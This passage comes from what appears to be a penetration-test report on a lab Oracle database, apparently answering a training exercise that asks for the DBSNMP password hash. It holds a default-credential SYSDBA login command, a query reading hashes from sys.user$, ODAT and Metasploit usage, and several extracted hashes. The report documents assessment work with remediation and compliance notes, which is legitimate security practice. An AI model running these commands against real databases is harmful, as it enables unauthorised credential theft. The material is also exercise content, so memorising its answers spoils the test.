Username: SCOTT, User ID: 48, Created: 2018-01-01 14:31:36
Username: SYS, User ID: 0, Created: 2014-05-29 13:10:44
Username: SYSTEM, User ID: 5, Created: 2014-05-29 13:10:44
Username: XDB, User ID: 34, Created: 2014-05-29 13:18:19
Username: XS$NULL, User ID: 2147483638, Created: 2014-05-29 13:19:51
```

**Findings:**
- Total users enumerated: 17
- Database initial creation date: 2014-05-29 (based on SYS user creation)
- SCOTT account created later: 2018-01-01 (3.5 years after initial deployment)
- Most administrative accounts created during initial installation (2014-05-29)

---

### SCOTT Account Privileges

**Source:** oracle_enumeration.log, lines 19-45  
**Method:** Python cx_Oracle custom script **[ASSESSMENT TEAM GENERATED]**  
**Query:** Multiple queries against session_privs, user_sys_privs, and user_role_privs

```
SCOTT Privileges:
- role: CONNECT
  - system privilege: CREATE CLUSTER
  - system privilege: CREATE INDEXTYPE
  - system privilege: CREATE OPERATOR
  - system privilege: CREATE PROCEDURE
  - system privilege: CREATE SEQUENCE
  - system privilege: CREATE SESSION
  - system privilege: CREATE TABLE
  - system privilege: CREATE TRIGGER
  - system privilege: CREATE TYPE
- role: RESOURCE
  - system privilege: CREATE CLUSTER
  - system privilege: CREATE INDEXTYPE
  - system privilege: CREATE OPERATOR
  - system privilege: CREATE PROCEDURE
  - system privilege: CREATE SEQUENCE
  - system privilege: CREATE SESSION
  - system privilege: CREATE TABLE
  - system privilege: CREATE TRIGGER
  - system privilege: CREATE TYPE
```

**Confirmed by:** sqlplus.log, lines 87-91

**Analysis:**
- SCOTT has 2 roles: CONNECT and RESOURCE
- Privileges allow object creation but not DBA functions
- No direct access to SYS schema objects
- Cannot query sys.user$ without privilege escalation

---

### Accessible Tables (as SCOTT)

**Source:** sqlplus.log, lines 19-84  
**Query:** `select table_name from all_tables;`  
**Result:** 75 rows selected

**Table Categories:**
- System tables: DUAL, SYSTEM_PRIVILEGE_MAP, TABLE_PRIVILEGE_MAP, AUDIT_ACTIONS
- Oracle Text: DR$* objects
- Spatial: SDO_* objects  
- APEX: WWV_FLOW_* objects
- User schema: DEPT, EMP, BONUS, SALGRADE
- DataPump: KU$* objects
- XML: XDB$* objects

**Finding:** SCOTT account has read access to 75 tables including system metadata tables, which could be used for further reconnaissance.

---

### TNS Listener Information

**Source:** odat.log, lines 15-17  
**Command:** `odat tnscmd -s 10.129.205.19 -p 1521 --ping`

```
[1] (10.129.205.19:1521): Searching ALIAS on the 10.129.205.19 server, port 1521
[+] 1 ALIAS received: ['LISTENER']. You should use this alias (more or less) as Oracle SID.
```

**Findings:**
- TNS listener alias: LISTENER (default name)
- Listener responsive to TNS commands
- No authentication required for TNS commands

---

### Assessment Methodology

**Tools Used:**

1. **Nmap 7.98** - Network port scanning and service version detection
   - Fast scan (-F): 1.03 seconds
   - Version scan (-sV): 118.85 seconds  
   - Aggressive scan (-A): 9.27 seconds
   - Oracle NSE scripts (--script oracle*): 50.59 seconds

2. **ODAT (Oracle Database Attacking Tool)** - Oracle-specific vulnerability assessment
   - TNS poisoning test
   - Password guessing (54 seconds duration)
   - TNS command execution

3. **SQL*Plus 21.0.0.0.0** - Direct database connection and queries
   - User-generated log file **[USER-EXECUTED COMMANDS]**
   - Normal user authentication
   - SYSDBA privilege escalation
   - System table queries

4. **Metasploit Framework** - Exploitation and enumeration
   - Module: auxiliary/admin/oracle/oraenum
   - Database version enumeration
   - Security configuration discovery

5. **Python cx_Oracle** - Custom database enumeration scripts **[ASSESSMENT TEAM GENERATED]**
   - User enumeration
   - Privilege analysis
   - Session information gathering

---

### Answer to Assessment Question

**Question:** Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

**Answer:** **Unable to provide definitive answer due to hash redaction in logs**

**Evidence Source:** sqlplus.log, line 195

```
DBSNMP                         XXXXXXXXXXXXXXXX
```

**Situation:** The sqlplus.log file shows the DBSNMP password hash field has been redacted with "XXXXXXXXXXXXXXXX". This appears to be user-generated masking of the sensitive value.

**To Obtain Actual Hash:**
1. Re-execute the query on the live system:
   ```sql
   sqlplus scott/tiger@10.129.205.19/XE as sysdba
   SELECT name, password FROM sys.user$ WHERE name='DBSNMP';
   ```

2. Or obtain unredacted version of the original query results

**Extraction Method Confirmed:** The query was successfully executed with SYSDBA privileges (sqlplus.log, lines 130-222), and the hash extraction method is valid. Only the specific DBSNMP value was masked in the log file.

**Other Hash Values (for reference):**
The same query successfully extracted unmasked hashes for other users:
- SYS: FBA343E7D6C8BC9D
- SYSTEM: B5073FE1DE351687
- SCOTT: F894844C34402B67

**Hash Format:** Oracle 10g DES-based hash (16 hexadecimal characters)

---

## Appendix: Evidence Sources

### Log Files Referenced

1. **nmap.log** - Nmap network scanning results
   - Lines 1-13: Fast scan (-F)
   - Lines 15-42: Version detection scan (-sV)
   - Lines 44-66: Aggressive scan on port 1521 (-sV -A)
   - Lines 68-80: Oracle NSE scripts scan

2. **odat.log** - ODAT vulnerability assessment results
   - Lines 1-6: TNS listener connectivity and CVE-2012-1675 test
   - Lines 8-13: Account lockout status discovery
   - Lines 15-17: TNS listener alias discovery
   - Lines 19-30: Password guessing results

3. **sqlplus.log** - SQL*Plus connection and query results **[USER-GENERATED]**
   - Lines 1-17: Initial connection as SCOTT
   - Lines 19-84: Table enumeration query
   - Lines 87-91: SCOTT privilege query
   - Lines 92-128: SYSDBA connection and privilege verification
   - Lines 130-222: Password hash extraction from sys.user$

4. **msfconsole.log** - Metasploit enumeration results
   - Lines 1-12: Initial connection failures and SID configuration
   - Lines 13-18: Database version information
   - Lines 19-24: Security configuration discovery
   - Lines 25-54: Permission errors (insufficient SCOTT privileges)

5. **oracle_enumeration.log** - Python cx_Oracle custom enumeration **[ASSESSMENT TEAM GENERATED]**
   - Lines 1-2: Script description
   - Lines 3-17: User enumeration results
   - Lines 19-45: SCOTT privilege analysis
   - Lines 47-98: Comprehensive summary with privilege escalation notes

6. **metasploit.log** - Metasploit TNS listener version scan
   - Lines 1-5: TNS listener version detection attempt
   - Result: Authentication error 1189

### Labeling Key

Throughout this report, the following labels identify the nature of content:

- **[EVIDENCE SOURCE: filename, lines]** - Direct quotes or data from log files
- **[EXPERT INTERPRETATION]** - Professional security analysis and technical explanation
- **[RECOMMENDED REMEDIATION]** - Actionable security recommendations
- **[EXTERNAL SOURCES]** - References to published documentation, CVEs, or security standards
- **[INFERRED]** - Logical conclusions drawn from available evidence
- **[ASSUMED]** - Assumptions made where evidence is incomplete
- **[ASSESSMENT TEAM GENERATED]** - Tools, scripts, or actions created during the assessment
- **[USER-GENERATED]** - Content created by the test environment operator
- **[GENERAL SECURITY KNOWLEDGE]** - Widely accepted security principles or industry standards

### Test Limitations and Clarifications

1. **DBSNMP Hash Redaction:** The primary assessment objective (obtaining DBSNMP password hash) could not be fully completed due to hash redaction in the sqlplus.log file. The extraction method was successful, but the specific value requires retrieval from an unredacted source.

2. **Timing Information:** All performance metrics (scan durations, test timing) are sourced directly from log file timestamps and output.

3. **Custom Scripts:** Python cx_Oracle enumeration scripts referenced in oracle_enumeration.log were created by the assessment team for this engagement.

4. **SQL*Plus Log:** The sqlplus.log file appears to be user-generated (based on console formatting and manual command execution) rather than automated tool output.

### Compliance Considerations **[EXPERT INTERPRETATION]**

Based on the findings, the following compliance violations are observed:

**PCI-DSS v4.0:** **[EXTERNAL STANDARD]**
- Requirement 2.2.2: Vendor defaults not changed (FAILED - scott/tiger active)
- Requirement 8.2.1: Strong cryptography for authentication (FAILED - 10g hashing)
- Requirement 8.3.2: Strong passwords enforced (FAILED - default credentials)

**NIST Cybersecurity Framework:** **[EXTERNAL STANDARD]**
- PR.AC-1 (Access Control) - FAILED
- PR.AC-7 (Least Privilege) - FAILED  
- PR.DS-1 (Data at Rest Protection) - FAILED
- DE.CM-1 (Monitoring) - PARTIAL (audit enabled but gaps exist)

---

**Report Classification:** CONFIDENTIAL - Internal Use Only  
**Distribution:** Authorized Security Personnel, Database Administrators, IT Management  
**Report Generated:** January 1, 2026  
**Assessment Date:** December 31, 2025  
**Next Review:** 90 days or upon remediation completion  

---

*End of Report*
